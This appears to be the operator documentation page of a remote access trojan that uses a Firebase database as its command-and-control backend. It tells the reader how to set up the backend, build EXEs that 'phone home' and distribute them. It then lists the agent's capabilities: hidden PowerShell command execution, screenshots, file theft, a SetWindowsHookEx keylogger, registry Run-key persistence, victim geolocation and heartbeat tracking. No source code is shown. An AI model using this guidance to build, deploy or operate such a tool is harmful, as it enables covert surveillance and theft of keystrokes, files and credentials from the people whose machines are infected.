Build & Deploy

Set up your Firebase backend once, then stamp EXEs and distribute them. Each EXE phones home to your dashboard.

Firebase Setup

One-time setup. Your Firebase project is your backend — it's free and stores all client connections.

1
Go to console.firebase.google.com → Add project (free Spark plan, no credit card).
2
Inside your project → Realtime Database → Create database → Start in test mode → your DB URL appears at the top (e.g. https://zero-x-abc123-default-rtdb.firebaseio.com).
3
Project Settings (gear icon) → Service accounts tab → scroll to Database secrets → Show → copy the secret string.
4
Paste both below and hit Save. That's it — your dashboard is now live.

Features

Agent Capabilities

Everything the deployed EXE can do. Commands are sent from the Terminal tab.

Shell Execution

Run any cmd.exe command. Output streams back to the terminal. 10-second timeout, 64 KB cap.

PowerShell

Prefix any command with ps: to route it through powershell.exe -NoP -NonI -W Hidden.

Screenshot

Type screenshot — captures the full desktop, base64-encodes it, returns a viewable image in the terminal.

File Browser

Type ls C:\Users\ to list any directory. Returns names, sizes, and modified dates.

File Download

Type download C:\path\to\file.txt — reads it, base64-encodes, sends back. Max 4 MB.

Keylogger

Uses SetWindowsHookEx to buffer keystrokes. Type keylog to flush the buffer to the terminal.

System Info

Type sysinfo — returns hostname, username, OS version, RAM, CPU, architecture, and running processes.

Persistence

Auto-installs to HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run on first launch. Survives reboots.

Kill Switch

Type kill to terminate the agent process on the target machine immediately.

IP Geolocation

On checkin, grabs public IP via api.ipify.org and resolves city/country/lat-lon via ip-api.com. Drops a pin on your map.

Process List

Type ps list to get a full snapshot of running processes: PID, name, and memory usage.

Live Heartbeat

Agent pings Firebase every 20 seconds with a timestamp. Dashboard shows real-time online/idle/offline status per client.
